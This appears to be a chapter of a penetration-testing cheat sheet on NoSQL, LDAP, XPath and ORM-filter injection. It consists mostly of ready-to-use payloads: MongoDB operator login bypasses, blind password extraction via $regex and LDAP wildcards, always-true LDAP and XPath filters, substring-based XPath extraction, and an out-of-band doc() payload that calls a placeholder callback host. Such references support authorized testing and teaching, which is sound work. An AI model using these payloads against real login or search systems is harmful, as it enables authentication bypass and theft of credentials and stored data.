# Ch03 — NoSQL, LDAP & XPath Injection

> Operator injection and auth bypass for document stores (MongoDB/CouchDB), directory filters (LDAP), and XML path queries.
> Sources: `NoSQL Injection/`, `LDAP Injection/`, `XPATH Injection/`, `ORM Leak/`.

**Route here when**: login/search APIs backed by MongoDB or other document stores (JSON or array-notation params), directory-backed auth (AD/OpenLDAP login forms), or XML-backed queries.

## NoSQL injection

**When-to-use**: params like `{"user":"x","pass":"y"}` (JSON body) or `user=x&pass=y` (urlencoded) where the app builds a Mongo-style query. PHP frameworks auto-parse `param[$op]` into query operators.

### Detection

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

```ps1
username[$ne]=x&password[$ne]=x
```

Signal: login succeeds / different record set returned. `'`/`"` payloads that break JSON syntax producing errors also confirm injection.

### Auth bypass — urlencoded operators

```ps1
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

### Auth bypass — JSON body

```json
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$in": ["Admin","4dm1n","admin","root","administrator"]}, "password": {"$gt": ""}}
```

### Operator reference

| Operator | Meaning | Use |
|---|---|---|
| `$ne` | not equal | auth bypass (`$ne:null` = any existing user) |
| `$gt` / `$lt` | greater/less | bypass + range probing |
| `$regex` | regex match | char-by-char data extraction |
| `$nin` / `$in` | not-in / in list | bypass + candidate enumeration |
| `$where` | JS expression | code eval in query (older Mongo) |
| `$lookup` / pipeline | aggregation join | cross-collection reads |

### Blind extraction (password field via `$regex`)

```ps1
username[$ne]=toto&password[$regex]=.{1}     → true → length ≥1
username[$ne]=toto&password[$regex]=m.{2}    → prefix m, total 3
username[$ne]=toto&password[$regex]=md.*     → starts with "md"
```

```json
{"username": {"$eq": "admin"}, "password": {"$regex": "^m"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md"}}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp"}}
```

GET variant: `?username=admin&password[$regex]=^PASSPREFIX` — oracle = login success / redirect / "OK" string.

### Filter tricks

- Duplicate keys: `{"id":"10","id":"100"}` — last wins in Mongo, first may win in the app validator → validator sees `10`, DB sees `100`.
- Content-type juggling: send the same operator payload as `application/x-www-form-urlencoded` with `[$op]` notation when JSON is blocked.
- Aggregation pipelines: `$lookup`/`$match`/`$project` when the app concatenates user input into a pipeline stage.

## LDAP injection

**When-to-use**: auth or search backed by `(uid=...)`, `(&(user=X)(pass=Y))`, `(cn=...)` filters. Special chars that break filters: `* ( ) \ | & ! = ~ > <` and NUL.

### Auth bypass — always-true filter

Target query `(&(uid=USER)(password=PASS))`:

```sql
user = *)(uid=*))(|(uid=*
pass = anything
→ (&(uid=*)(uid=*))(|(uid=*)(password=anything))        // always-true left side
```

```sql
user = admin)(!(&(1=0
pass = q))
→ (&(uid=admin)(!(&(1=0)(password=q))))                 // AND-of-true ∧ NOT(false)
```

Also try `admin*` wildcards, `*)(&`, `*)(|(`.

### Blind attribute extraction

Wildcard-prefix guessing — oracle = entry matched vs not:

```sql
(&(sn=administrator)(password=M*))   → match
(&(sn=administrator)(password=MY*))  → match
(&(sn=administrator)(password=MYK*)) → match → next char
```

Field discovery: `login=*)(ATTR=*))\x00` — cycle ATTR through `userPassword surname name cn sn objectClass mail givenName commonName`; a TRUE response means the attribute exists.

`userPassword` is an OCTET STRING — use ordering-match OID for byte-wise guessing:

```ps1
userPassword:2.5.13.18:=\xx
userPassword:2.5.13.18:=\xx\xx
```

## XPath injection

**When-to-use**: XML-backed auth/search — app builds `//user[name='X' and password='Y']` style queries.

### Bypass / breakout payloads

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
' or count(parent::*)>0 or 'a'='a
x' or name()='username' or 'x'='y
```

Navigation/enumeration probes:

```sql
/
//
//*
*/*
@*
count(/child::node())
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

### Blind extraction

```sql
' and string-length(account)=SIZE and '1'='1
' and substring(//user[userid=5]/username,2,1)='a' and '1'='1
' and substring(//user[userid=5]/username,2,1)=codepoints-to-string(97) and '1'='1
```

### Out-of-band

```powershell
?title=x&type=*&rent_days=* and doc('//YOUR-CALLBACK/SHARE')
```

`doc()`/`document()` fetch external URIs → SSRF-ish readout where the XPath engine allows it.

## ORM-leak note

When the app exposes query filters through an ORM (Django `__` lookups, Prisma where-clauses, Hibernate HQL):

```json
{"filters": {"password__startswith": "a"}}
{"where": {"password": {"startsWith": "s"}}}
```

Look for `__contains`, `__startswith`, `__regex`, `__gt` suffixes on JSON field names — they reach the ORM's field lookup and can leak field values the same way `$regex` does for Mongo.
